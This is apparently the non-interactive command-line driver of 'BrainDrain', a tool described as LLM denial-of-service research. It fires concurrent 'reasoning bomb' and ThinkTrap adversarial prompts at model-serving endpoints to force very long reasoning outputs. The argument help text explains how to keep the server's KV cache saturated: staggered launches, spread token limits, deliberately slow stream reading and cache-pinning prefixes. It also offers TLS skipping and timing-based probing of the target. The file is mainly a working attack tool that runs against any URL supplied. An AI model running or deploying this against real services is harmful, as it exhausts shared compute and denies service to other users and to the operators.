#!/usr/bin/env python3
"""
bdscript.py — BrainDrain non-interactive script interface.

Maps every interactive wizard option to a command-line flag so the tool
can be driven from scripts, cron jobs, or distributed deployments without
a human at the keyboard. Mirrors nmap's flag-based UX pattern.

Results can be saved to a JSON file with --output for centralised collection.
In non-TTY environments (redirected stdout, SSH sessions without a pseudo-tty)
Rich's live display is automatically disabled by the library.

Basic usage:
    python bdscript.py -t http://10.0.0.1:8000 -m deepseek-r1-7b

Full example:
    python bdscript.py \\
        --target http://10.0.0.1:8000 --model deepseek-r1-7b \\
        --attack reasoning_bomb --instances 8 --budget-tier 256 \\
        --max-tokens 16384 --stagger 8 --spread 25 --stream-delay 0.01 \\
        --system-prompt "You are a helpful assistant." \\
        --output results/run_001.json

Custom descriptor (e.g. Anthropic extended-thinking via Vertex):
    python bdscript.py \\
        --format custom --custom-descriptor descriptor.json \\
        --response-format anthropic --model claude-opus-4-5 \\
        --attack reasoning_bomb --instances 4 --output results/vertex.json
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
from pathlib import Path
from typing import Optional

from core.base_attack import APIFormat, TargetConfig

# Import the orchestrator and helpers from the interactive CLI without
# triggering its main() — safe because BrainDrain.py guards with
# `if __name__ == "__main__"`.
from BrainDrain import (
    AttackOrchestrator,
    try_fetch_context_length,
    _estimate_prompt_tokens,
)


# ─────────────────────────────────────────────
# Argument parser
# ─────────────────────────────────────────────

def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="bdscript",
        description="BrainDrain — non-interactive LLM DoS research script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
TARGET FORMATS
  openai    OpenAI-compatible chat completions (/v1/chat/completions).
            Works with vLLM, llama.cpp server, Together AI, Groq, etc.
  anthropic Direct Anthropic Messages API (/v1/messages).
  ollama    Local Ollama instance (/api/chat).
  vertex    Google Vertex AI. Pass the full model path as --target:
              https://LOCATION-aiplatform.googleapis.com/v1/projects/
              PROJECT/locations/LOCATION/publishers/google/models/MODEL
            Use --api-key with a token from `gcloud auth print-access-token`.
  custom    Paste a request descriptor JSON file via --custom-descriptor.
            The file must have the shape:
              { "url": "...", "headers": {...}, "body": {..., "content": "__PROMPT__"} }
            The string "__PROMPT__" is replaced with the attack prompt at runtime.

ATTACK TYPES
  reasoning_bomb   Short math/logic puzzles that induce pathologically long
                   reasoning traces in Large Reasoning Models (LRMs). Based on
                   Liu et al. 2026. Only effective against models with a reasoning
                   / extended thinking mode (DeepSeek-R1, QwQ, Gemini 2.5,
                   Claude 3.7+ Sonnet, etc.).
  think_trap       Pre-optimised adversarial prompts generated offline by a
                   CMA-ES search. Effective against general instruction-tuned
                   models. Requires a prompt cache JSON file; generate it first
                   with ThinkTrapAPG (see attacks/think_trap.py). Based on
                   Li et al. NDSS 2026.

EXAMPLES
  # Reasoning bomb, 8 instances, auto-detect max tokens
  python bdscript.py -t http://localhost:8000 -m deepseek-r1-7b -n 8

  # ThinkTrap against an Anthropic-format server
  python bdscript.py -t https://api.example.com -m claude-3-opus \\
      --format anthropic --api-key sk-... \\
      --attack think_trap --instances 4 --stagger 10 --output out.json

  # Reasoning bomb with all pressure options
  python bdscript.py -t http://10.0.0.1:8000 -m qwen3-32b \\
      --attack reasoning_bomb --budget-tier mixed --instances 16 \\
      --max-tokens 32000 --stagger 2.0 --spread 25 --stream-delay 0.01 \\
      --system-prompt "Think step by step." --output results/qwen.json
""",
    )

    # ── Target ────────────────────────────────────────────────────────────────
    tgt = p.add_argument_group("Target")
    tgt.add_argument(
        "-t", "--target", metavar="URL",
        help="Base URL of the target (e.g. http://10.0.0.1:8000). "
             "Required for all formats except --format custom (where it is "
             "taken from the descriptor file).",
    )
    tgt.add_argument(
        "-m", "--model", metavar="NAME",
        help="Model name sent in every request (e.g. deepseek-r1-7b). "
             "Derived automatically for --format vertex. "
             "Optional for --format custom (falls back to descriptor or 'custom').",
    )
    tgt.add_argument(
        "-f", "--format",
        choices=["openai", "anthropic", "ollama", "vertex", "custom"],
        default="openai",
        help="API wire format (default: openai).",
    )
    tgt.add_argument(
        "-k", "--api-key", metavar="KEY",
        help="API key / Bearer token. Omit for unauthenticated local servers. "
             "For Vertex AI use an OAuth2 token from `gcloud auth print-access-token`.",
    )
    tgt.add_argument(
        "--timeout", type=float, metavar="SECONDS",
        help="Per-request HTTP timeout in seconds. "
             "Omit (recommended) for long-running attack requests.",
    )
    tgt.add_argument(
        "--no-stream-options", action="store_true",
        help="Do not include stream_options in the request body. "
             "Required for older Ollama versions that reject the field.",
    )
    tgt.add_argument(
        "--no-verify-ssl", action="store_true",
        help="Skip TLS certificate verification (useful for self-signed certs).",
    )
    tgt.add_argument(
        "-S", "--system-prompt", metavar="TEXT",
        help="System prompt sent with every attack and probe request. "
             "A shared prefix pins all requests to the same KV-cache slot "
             "via prefix-aware routing (vLLM APC), concentrating pressure.",
    )
    tgt.add_argument(
        "--request-prefix", metavar="TEXT",
        help="Text prepended to every user message (attack and probe). "
             "Same KV-pinning effect as --system-prompt.",
    )

    # ── Custom format ─────────────────────────────────────────────────────────
    cust = p.add_argument_group(
        "Custom format",
        description="Options for --format custom only.",
    )
    cust.add_argument(
        "--custom-descriptor", metavar="PATH",
        help="Path to a JSON request descriptor file. "
             'Required with --format custom. The "body" field must contain '
             '"__PROMPT__" as the message content placeholder.',
    )
    cust.add_argument(
        "--response-format",
        choices=["openai", "anthropic", "ollama", "vertex"],
        default="openai",
        help="Response stream format used to parse replies from a custom endpoint "
             "(default: openai).",
    )

    # ── Attack ────────────────────────────────────────────────────────────────
    atk = p.add_argument_group("Attack")
    atk.add_argument(
        "-a", "--attack",
        choices=["reasoning_bomb", "think_trap"],
        default="reasoning_bomb",
        help="Attack technique (default: reasoning_bomb).",
    )
    atk.add_argument(
        "-n", "--instances", type=int, default=4, metavar="N",
        help="Number of concurrent attacker instances (default: 4). "
             "Use the KV saturation calculator to find the right value for "
             "your target GPU.",
    )
    atk.add_argument(
        "--max-tokens", type=int, metavar="N",
        help="max_tokens / max_completion_tokens per request. "
             "If omitted the server is probed automatically to detect the "
             "context window and a safe value is derived.",
    )
    atk.add_argument(
        "--budget", type=int, metavar="TOKENS",
        help="Stop after generating this many output+reasoning tokens in total "
             "across all instances. Omit to run until Ctrl+C.",
    )
    atk.add_argument(
        "--no-preflight", action="store_true",
        help="Skip the pre-flight connectivity check (one test request before "
             "launching all instances).",
    )

    # ── Reasoning Bomb ────────────────────────────────────────────────────────
    rb = p.add_argument_group(
        "Reasoning Bomb",
        description="Options for --attack reasoning_bomb.",
    )
    rb.add_argument(
        "--puzzle-file", metavar="PATH",
        default="prompts/reasoningBomb_puzzles.json",
        help="Path to the ReasoningBomb puzzle JSON file "
             "(default: prompts/reasoningBomb_puzzles.json). "
             "Download from https://github.com/SaFo-Lab/ReasoningBomb.",
    )
    rb.add_argument(
        "--budget-tier",
        choices=["128", "256", "512", "mixed"],
        default="256",
        help="Puzzle token-budget tier (default: 256). Shorter tiers yield "
             "higher amplification ratios. 'mixed' rotates 128/256/512 across "
             "instances to prevent synchronised completions.",
    )

    # ── ThinkTrap ─────────────────────────────────────────────────────────────
    tt = p.add_argument_group(
        "ThinkTrap",
        description="Options for --attack think_trap.",
    )
    tt.add_argument(
        "--prompts-file", metavar="PATH",
        default="prompts/thinktrap_prompts.json",
        help="Path to the ThinkTrap adversarial prompt cache JSON "
             "(default: prompts/thinktrap_prompts.json). "
             "Generate with ThinkTrapAPG first (see attacks/think_trap.py).",
    )

    # ── Sustained pressure ────────────────────────────────────────────────────
    pres = p.add_argument_group(
        "Sustained pressure",
        description="Settings that prevent simultaneous request completions "
                    "(the 'wave pattern') which would briefly free the KV cache "
                    "and let the scheduler recover.",
    )
    pres.add_argument(
        "--stagger", type=float, default=0.0, metavar="SECONDS",
        help="Delay between starting each successive instance in seconds "
             "(default: 0 / off). Rule of thumb: est_request_duration / n_instances.",
    )
    pres.add_argument(
        "--spread", type=float, default=0.0, metavar="PERCENT",
        help="Distribute max_tokens linearly across instances within ±PERCENT of "
             "the target value (default: 0 / off). Prevents synchronised "
             "completions after the stagger window passes. "
             "Example: --max-tokens 16000 --spread 25 gives instances "
             "[12000, 13333, 14667, 16000].",
    )
    pres.add_argument(
        "--stream-delay", type=float, default=0.0, metavar="SECONDS",
        help="Sleep between reading each streamed response chunk (default: 0 / off). "
             "Backs up the server output queue, holding KV blocks allocated "
             "beyond pure generation time. Recommended range: 0.005–0.02 s.",
    )
    pres.add_argument(
        "--no-probe", action="store_true",
        help="Disable ITL side-channel probing during the attack. "
             "Also skips baseline calibration. Use when the target rate-limits "
             "all traffic and probe requests would consume the quota.",
    )

    # ── Output ────────────────────────────────────────────────────────────────
    out = p.add_argument_group("Output")
    out.add_argument(
        "-o", "--output", metavar="PATH",
        help="Write a JSON run summary to this file after the attack completes. "
             "The file contains the run config and all aggregate metrics. "
             "Parent directories are created automatically.",
    )

    return p


# ─────────────────────────────────────────────
# Target builder
# ─────────────────────────────────────────────

def _build_target(args: argparse.Namespace) -> TargetConfig:
    fmt_map = {
        "openai":    APIFormat.OPENAI,
        "anthropic": APIFormat.ANTHROPIC,
        "ollama":    APIFormat.OLLAMA,
        "vertex":    APIFormat.VERTEX,
    }

    if args.format == "custom":
        if not args.custom_descriptor:
            print("error: --custom-descriptor is required with --format custom",
                  file=sys.stderr)
            sys.exit(1)
        desc_path = Path(args.custom_descriptor)
        if not desc_path.exists():
            print(f"error: descriptor file not found: {desc_path}", file=sys.stderr)
            sys.exit(1)
        with desc_path.open() as fh:
            descriptor = json.load(fh)

        resp_map = {
            "openai":    APIFormat.OPENAI,
            "anthropic": APIFormat.ANTHROPIC,
            "ollama":    APIFormat.OLLAMA,
            "vertex":    APIFormat.VERTEX,
        }
        api_format    = resp_map[args.response_format]
        endpoint_url  = descriptor.get("url", "")
        extra_headers = {k: v for k, v in descriptor.get("headers", {}).items()
                         if k.lower() != "content-type"}
        body_template = descriptor.get("body")
        model         = args.model or descriptor.get("body", {}).get("model", "custom")

        if not endpoint_url:
            print("error: descriptor JSON has no 'url' field", file=sys.stderr)
            sys.exit(1)

        return TargetConfig(
            base_url=endpoint_url,
            model=model,
            api_format=api_format,
            api_key=None,
            endpoint_path="",
            timeout=args.timeout,
            verify_ssl=not args.no_verify_ssl,
            extra_headers=extra_headers,
            request_template=body_template,
            system_prompt=args.system_prompt,
            request_prefix=args.request_prefix,
        )

    # Standard formats
    if not args.target:
        print("error: --target is required", file=sys.stderr)
        sys.exit(1)

    api_format = fmt_map[args.format]
    base_url   = args.target
    if not base_url.startswith("http"):
        base_url = "https://" + base_url if args.format == "vertex" else "http://" + base_url

    if api_format == APIFormat.VERTEX:
        for suffix in (":streamGenerateContent", ":generateContent", ":predict"):
            if suffix in base_url:
                base_url = base_url.split(suffix)[0]
                break
        base_url = base_url.rstrip("/")
        model = args.model or base_url.split("/")[-1]
    else:
        if not args.model:
            print("error: --model is required for this format", file=sys.stderr)
            sys.exit(1)
        model = args.model

    return TargetConfig(
        base_url=base_url,
        model=model,
        api_format=api_format,
        api_key=args.api_key or None,
        timeout=args.timeout,
        verify_ssl=not args.no_verify_ssl,
        supports_stream_options=not args.no_stream_options,
        system_prompt=args.system_prompt,
        request_prefix=args.request_prefix,
    )


# ─────────────────────────────────────────────
# Auto max-tokens detection
# ─────────────────────────────────────────────

async def _detect_max_tokens(
    target: TargetConfig,
    attack_type: str,
    extra: dict,
) -> int:
    print("  Probing server for context window…", flush=True)
    try:
        detected = await try_fetch_context_length(target)
    except Exception:
        detected = None

    if detected:
        if attack_type == "reasoning_bomb":
            tier = extra.get("budget_tier", "0")
            prompt_est = (
                max(int(t) for t in ["128", "256", "512"])
                if tier == "mixed" else int(tier)
            )
        else:
            prompt_est = _estimate_prompt_tokens(attack_type, extra)
        usable = max(detected - prompt_est - 64, 1024)
        print(f"  Context window: {detected:,} tokens → max_tokens: {usable:,}", flush=True)
        return usable

    print("  Could not detect context window — defaulting to 16384.", flush=True)
    return 16384


# ─────────────────────────────────────────────
# JSON output
# ─────────────────────────────────────────────

def _save_output(path: str, args: argparse.Namespace, target: TargetConfig,
                 max_tokens: int, result_dict: dict) -> None:
    out_path = Path(path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    payload = {
        "config": {
            "target":         args.target or getattr(args, "custom_descriptor", None),
            "model":          target.model,
            "format":         args.format,
            "attack":         args.attack,
            "instances":      args.instances,
            "max_tokens":     max_tokens,
            "budget":         args.budget,
            "budget_tier":    args.budget_tier if args.attack == "reasoning_bomb" else None,
            "stagger_s":      args.stagger,
            "spread_pct":     args.spread,
            "stream_delay_s": args.stream_delay,
            "no_probe":       args.no_probe,
            "system_prompt":  args.system_prompt,
            "request_prefix": args.request_prefix,
        },
        "result": result_dict,
    }
    with out_path.open("w") as fh:
        json.dump(payload, fh, indent=2)
    print(f"\n  Results saved → {out_path}", flush=True)


# ─────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────

def main() -> None:
    parser = _build_parser()
    args   = parser.parse_args()

    target = _build_target(args)

    # Build attack-specific extras
    extra: dict = {}
    if args.attack == "reasoning_bomb":
        extra["puzzle_file"] = args.puzzle_file
        extra["budget_tier"] = args.budget_tier
    elif args.attack == "think_trap":
        extra["prompts_file"] = args.prompts_file

    # Resolve max_tokens
    if args.max_tokens:
        max_tokens = args.max_tokens
    else:
        max_tokens = asyncio.run(_detect_max_tokens(target, args.attack, extra))

    orchestrator = AttackOrchestrator(
        target=target,
        attack_type=args.attack,
        n_instances=args.instances,
        max_tokens=max_tokens,
        token_budget=args.budget,
        attack_extra=extra,
        launch_stagger_s=args.stagger,
        max_tokens_spread_pct=args.spread,
        stream_read_delay_s=args.stream_delay,
        skip_probing=args.no_probe,
    )

    # Optionally disable the pre-flight check
    if args.no_preflight:
        async def _skip_preflight() -> bool:
            return True
        orchestrator.preflight_check = _skip_preflight

    try:
        asyncio.run(orchestrator.run())
    except KeyboardInterrupt:
        pass

    # Compute the final aggregate result and optionally save it.
    # (orchestrator.run() also calls _print_summary internally, so the terminal
    # already shows the table — this is only for the JSON file.)
    if args.output:
        result = orchestrator._collector.finalise(
            instance_stats=[inst.stats for inst in orchestrator._instances]
        )
        _save_output(args.output, args, target, max_tokens, result.to_dict())


if __name__ == "__main__":
    main()
